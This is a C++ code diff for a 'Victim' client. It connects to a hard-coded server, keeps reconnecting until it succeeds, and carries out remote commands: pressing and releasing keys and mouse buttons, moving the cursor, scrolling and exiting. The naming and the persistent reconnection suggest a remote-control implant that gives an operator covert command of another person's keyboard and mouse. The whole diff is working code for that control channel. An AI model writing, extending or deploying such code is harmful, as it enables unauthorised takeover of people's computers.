@@ -1,73 +1,89 @@
 #include "victim.h"
 
-Victim::Victim(sf::UdpSocket* s)
-    :
-    socket(s)
-{
+Victim::Victim()
+{    
     for (int i = 0; i < 256; i++)
         keysStates[i] = false;
+    connectServer();
 }
 
 int Victim::controlVictim()
 {
     while (isRunning)
     {
-        size_t size;
-        sf::IpAddress ip;
-        unsigned short port;
-        char msg[6];
-        socket->receive(msg, sizeof(msg), size, ip, port);
+        sf::Packet p;
+        server.receive(p);
 
-        if (ip != SERVER_IP || port != SERVER_PORT)
-            continue;
+        if (p.getDataSize() == 0) {
+            std::cout << "DISCONNECTED FROM SERVER\n";
+            connectServer();
+        }
+
+        sf::Uint8 cmd;
+        p >> cmd;
         
         //exit program
-        if (msg[0] == 'e') {
+        if (cmd == 'e') {
             isRunning = false;
         }
-        //key pressed
-        else if (msg[0] == 'n') {
-            int vkc = int(msg[1]);
-            keysStates[vkc] = true;
+        //key pressed-released
+        else if (cmd == 'n' || cmd == 'm') {
+            sf::Uint8 vkc;
+            p >> vkc;
+
+            bool state = (cmd == 'n');
+            keysStates[vkc] = state;
 
             //if its a mouse key, treat it accordingly
             if (vkc == 0x01 || vkc == 0x02 || vkc == 0x04 || vkc == 0x05 || vkc == 0x06)
-                Mlib::Mouse::setState(Mlib::Mouse::Button(vkc), true);
+                Mlib::Mouse::setState(Mlib::Mouse::Button(vkc), state);
             else
-                Mlib::Keyboard::setState(Mlib::Keyboard::Key(vkc), true);
-        }
-        //key released
-        else if (msg[0] == 'm') {
-            int vkc = int(msg[1]);
-            keysStates[vkc] = false;
-
-            //if its a mouse key, treat it accordingly
-            if (vkc == 0x01 || vkc == 0x02 || vkc == 0x04 || vkc == 0x05 || vkc == 0x06)
-                Mlib::Mouse::setState(Mlib::Mouse::Button(vkc), false);
-            else
-                Mlib::Keyboard::setState(Mlib::Keyboard::Key(vkc), false);
+                Mlib::Keyboard::setState(Mlib::Keyboard::Key(vkc), state);
         }
         //mouse moved
-        else if (msg[0] == 'l') {
-            auto val = [](char c) {
-                return ((int(c) >= 0) ? int(c) : 256+int(c));
-            };
-            float x, y;
-            x = val(msg[1]) / 256.f;
-            y = val(msg[2]) / 256.f;
-            Mlib::Mouse::setPos(Mlib::Vec2i(x * screenSize.x, y * screenSize.y));
+        else if (cmd == 'l') {
+            sf::Uint8 a, b;
+            p >> a >> b;
+            float x = a / 256.f * screenSize.x;
+            float y = b / 256.f * screenSize.y;
+            Mlib::Mouse::setPos(Mlib::Vec2i(x, y));
         }
         //wheel scrolled
-        else if (msg[0] == 'k')
-        {
-            Mlib::Mouse::simulateScroll(int(msg[1]) * 100.f);
+        else if (cmd == 'k') {
+            sf::Int8 delta;
+            p >> delta;
+            Mlib::Mouse::simulateScroll(delta * 100.f);
         }
         //release all keys
-        else if (msg[0] == 'a') {
+        else if (cmd == 'a') {
             for (int i = 0; i < 255; i++)
                 Mlib::Keyboard::setState(Mlib::Keyboard::Key(i), false);
+        }
+        //apparently victim isnt initialized
+        else if (cmd == '?') {
+            connectServer();
         }
     }
 
     return 0;
+}
+
+void Victim::connectServer()
+{
+    while (server.connect(SERVER_IP, SERVER_PORT) != sf::Socket::Done) {}
+    std::cout << "connected with server\n";
+
+init:
+    sf::Uint8 role = '-';
+    sf::Packet p;
+    p << sf::Uint8('v');
+    server.send(p);
+    p.clear();
+    server.receive(p);
+    p >> role;
+    if (role != 'v')
+        goto init;
+    std::cout << "connection with server approved\n";
+
+    isConnected = true;
 }
